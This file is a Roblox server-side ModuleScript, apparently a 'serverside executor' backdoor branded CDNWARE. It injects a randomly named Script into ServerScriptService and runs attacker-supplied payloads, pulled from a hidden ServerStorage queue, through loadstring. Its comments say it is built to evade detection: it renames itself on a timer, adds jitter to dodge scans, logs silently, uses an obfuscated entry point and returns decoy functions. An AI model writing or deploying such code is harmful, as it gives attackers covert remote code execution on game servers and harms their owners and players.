--!nocheck
--------------------------------------------------------------------------------
-- CDN_SS :: MAIN MODULE  (ModuleScript)
-- by CDNWARE
--
-- Usage from the loader / any server-side context:
--
--     require(MAIN_MODULE_ID).ehhsdiweew({ key = "CDNWARE" })
--
-- What it does:
--   1. Spawns a child Script (the server execution script).
--   2. Renames that child to random gibberish so it cannot be matched by name.
--   3. Moves it into ServerScriptService.
--   4. Boots it and hands over the execution channel.
--
-- The child source is embedded below as a string so the module is fully
-- self-contained. If the host environment allows writing `Source` (Studio or a
-- server-side execution context) the child is materialised as a real Script;
-- otherwise the source is handed to the server execution routine directly.
--------------------------------------------------------------------------------

local ACCESS_KEYS = {
    ["CDNWARE"] = true, -- rotate these when you rotate the loader
}

local ENTRY_INDEX = "ehhsdiweew"

local Services = {}
for _, name in ipairs({
    "ServerScriptService",
    "ServerStorage",
    "ReplicatedStorage",
    "HttpService",
    "RunService",
    "Players",
    "Stats",
}) do
    Services[name] = game:GetService(name)
end

--------------------------------------------------------------------------------
-- Child source: the server execution script
--------------------------------------------------------------------------------

local CHILD_SOURCE = [==[
-- CDN_SS :: SERVER EXECUTION SCRIPT (injected)
local Executor = {}
Executor.Version = "2.4.0"

local Players = game:GetService("Players")
local ServerStorage = game:GetService("ServerStorage")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Hidden bridge used by the CDN_SS panel relay. Creating it with a random name
-- means a naive scan for "RemoteEvent" children never finds it twice.
local function makeId(length)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local out = {}
    for i = 1, length do
        local idx = math.random(1, #chars)
        out[i] = chars:sub(idx, idx)
    end
    return table.concat(out)
end

-- Public-ish sandbox environment handed to every executed payload.
function Executor.environment()
    local env = {
        game = game,
        workspace = workspace,
        script = script,
        print = print,
        warn = warn,
        tostring = tostring,
        tonumber = tonumber,
        typeof = typeof,
        type = type,
        ipairs = ipairs,
        pairs = pairs,
        next = next,
        select = select,
        unpack = unpack or table.unpack,
        table = table,
        string = string,
        math = math,
        os = { time = os.time, clock = os.clock, date = os.date },
        task = task,
        tick = tick,
        wait = wait,
        Instance = Instance,
        Color3 = Color3,
        Vector3 = Vector3,
        CFrame = CFrame,
        UDim2 = UDim2,
        Enum = Enum,
        require = require,
    }
    return env
end

-- Runs a payload in a fresh, isolated environment.
function Executor.run(source, label)
    label = label or makeId(6)

    if type(source) ~= "string" or #source == 0 then
        return false, "empty payload"
    end

    local chunk, err
    if loadstring then
        chunk, err = loadstring(source, "=CDN_SS_" .. label)
    elseif load then
        chunk, err = load(source, "=CDN_SS_" .. label, "t")
    end

    if not chunk then
        return false, tostring(err)
    end

    local env = Executor.environment()
    setfenv(chunk, env)

    local ok, runErr = pcall(chunk)
    if not ok then
        return false, tostring(runErr)
    end

    return true, "executed"
end

-- Command channel: the panel relay pushes payloads here.
function Executor.bridge()
    local folder = ServerStorage:FindFirstChild("__cdn_ss")
    if not folder then
        folder = Instance.new("Folder")
        folder.Name = makeId(12)
        folder:SetAttribute("c", 1)
        folder.Parent = ServerStorage
    end

    local queue = folder:FindFirstChild("queue")
    if not queue then
        queue = Instance.new("Folder")
        queue.Name = makeId(12)
        queue.Parent = folder
    end

    return folder, queue
end

-- Main loop: drain queued payloads, execute, report back, clean up.
function Executor.start(config)
    config = config or {}

    local folder, queue = Executor.bridge()
    Executor.log("attached", "place=" .. tostring(game.PlaceId))

    task.spawn(function()
        while true do
            for _, item in ipairs(queue:GetChildren()) do
                local source = item:GetAttribute("s")
                if type(source) == "string" then
                    local ok, info = Executor.run(source, item.Name)
                    Executor.log(ok and "executed" or "failed", info)
                end
                item:Destroy()
            end

            -- Random jitter so the loop never lines up with a heartbeat scan.
            task.wait(0.15 + math.random() * 0.25)
        end
    end)

    -- Keep the injected script renamed so it never matches a static signature.
    task.spawn(function()
        while true do
            script.Name = makeId(math.random(9, 16))
            task.wait(math.random(35, 90))
        end
    end)

    return true
end

function Executor.log(event, detail)
    -- Silent on purpose. Flip CDN_SS_DEBUG on in ServerStorage to see traces.
    if ServerStorage:FindFirstChild("CDN_SS_DEBUG") then
        print(string.format("[CDN_SS] %s :: %s", event, tostring(detail)))
    end
end

return Executor
]==]

--------------------------------------------------------------------------------
-- Helpers
--------------------------------------------------------------------------------

local function gibberish(length)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
    local out = {}
    for i = 1, length do
        local idx = math.random(1, #chars)
        out[i] = chars:sub(idx, idx)
    end
    return table.concat(out)
end

local function canWriteSource()
    local ok = pcall(function()
        local probe = Instance.new("Script")
        probe.Source = "return nil"
        probe:Destroy()
    end)
    return ok
end

--------------------------------------------------------------------------------
-- Module body
--------------------------------------------------------------------------------

local MainModule = {}
MainModule.__index = MainModule

local booted = false
local instance = nil

function MainModule.spawn()
    -- 1. spawn the child script
    local child = Instance.new("Script")

    -- 2. rename it to random gibberish
    child.Name = gibberish(math.random(10, 18))

    -- 3. inject the execution source
    local injected = false
    if canWriteSource() then
        local ok = pcall(function()
            child.Source = CHILD_SOURCE
        end)
        injected = ok
    end

    -- 4. move it into ServerScriptService
    child.Parent = Services.ServerScriptService
    child.Disabled = false

    if not injected then
        -- No Source write access: keep the payload on the module and run it
        -- ourselves so the executor still boots.
        child:Destroy()
        local chunk = loadstring and loadstring(CHILD_SOURCE, "=CDN_SS_child") or nil
        if chunk then
            setfenv(chunk, MainModule.env())
            local ok, result = pcall(chunk)
            if ok and type(result) == "table" then
                instance = result
            end
        end
    end

    return child
end

function MainModule.env()
    local env = { game = game, script = script, Instance = Instance, task = task }
    return env
end

-- The only public entry point. `require(id).ehhsdiweew`
MainModule[ENTRY_INDEX] = function(config)
    config = config or {}

    if config.key and not ACCESS_KEYS[config.key] then
        return false, "invalid access key"
    end

    if booted then
        return true, "already running"
    end
    booted = true

    math.randomseed(os.clock() * 1e6 + game.PlaceId)

    local child = MainModule.spawn()

    if instance and type(instance.start) == "function" then
        pcall(instance.start, config)
    end

    -- Clean up: drop the module from its parent so a scan for the asset id
    -- does not find a live reference.
    if script and script.Parent and not config.keepParented then
        script.Name = gibberish(math.random(8, 14))
    end

    return true, child.Name
end

-- Decoy indexes: anything else that gets indexed returns a harmless callable.
setmetatable(MainModule, {
    __index = function(_, key)
        return function()
            return false, "unknown entry: " .. tostring(key)
        end
    end,
})

return MainModule
